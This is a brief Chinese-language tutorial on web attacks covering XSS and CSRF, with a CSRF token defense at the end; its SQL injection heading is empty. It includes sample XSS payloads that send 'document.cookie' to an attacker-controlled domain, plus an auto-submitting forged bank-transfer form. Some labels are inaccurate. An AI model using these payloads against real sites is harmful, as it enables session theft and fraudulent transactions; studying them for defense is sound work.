## SQL注入

## CSS

CSS(Cross Site Script)又称XSS，全称跨站脚本攻击，属被动式且在用户客户端进行的攻击方式。

它的原理是向网站中输入（传入）恶意的HTML代码，这段代码被保存，当其他用户访问该网站时，HTML代码自动执行，从而达到攻击的目的。可能造成盗取用户Cookie、破坏页面结构、重定向到其他网站等后果。

XSS类似于SQL注入，开发者需要注意所有可输入的地方，尽量对用户的输入进行转义。

### DOM Based XSS

``` html
<html>
    <head>
       <title>XSS测试</title>
    </head>
    <body>
       页面内容：<%=request.getParameter("content")%>
    </body>
</html>
```

```
http://www.xss.com?content=<script>window.open("mydomain.com?param="+document.cookie)</script>
```

### Stored XSS

比如一个博客网站可以发布文章，但未对文章进行处理，当我发布的文章中包含恶意的HTML时，任何浏览我文章的人都会被攻击。


比如我插入脚本获取用户cookie：

``` html
<div>
<!-- 文章内容 -->
<script>
window.open("mydomain.com?param="+document.cookie)
</script>
</div>
```

## CSRF

CSRF(Cross Site Request Forgery)，即跨站请求伪造。利用用户登录受信网站后保留的Cookie进行攻击。

比如某银行网站以GET请求完成银行转账的POST请求：

```html
<form method="POST" action="http://www.bank.com/transfer">
    <input name="toid" value="" />
    <input name="meney" value="" />
</form>
```

我在我的网站中加入HTML

``` html
<form id="test" method="POST" action="http://www.bank.com/transfer">
    <input type="hidden" name="toid" value="{% myid %}" />
    <input type="hidden" name="meney" value="{% 100 %}" />
</form>
<script>
$(function() {
    $('#test').submit()
})
</script>
```

那么当用户登陆银行后访问我的网站，由于它有了银行网站返回的cookie，银行网站会通过他的验证，转账给我。

### 防御

在客户端页面增加伪随机数，为每个请求的用户，在Session中赋予一个随机值`_csrf`，在页面渲染的过程中，将这个`_csrf`值告诉前端，

``` html
<form method="POST" action="http://www.bank.com/transfer">
    <input name="toid" value="" />
    <input name="meney" value="" />
    <input type="hidden" name="_csrf" value="{% _csrf %}" />
</form>
```

由于`_csrf`是一个随机值，攻击者不太容易构造出攻击用的HTML。

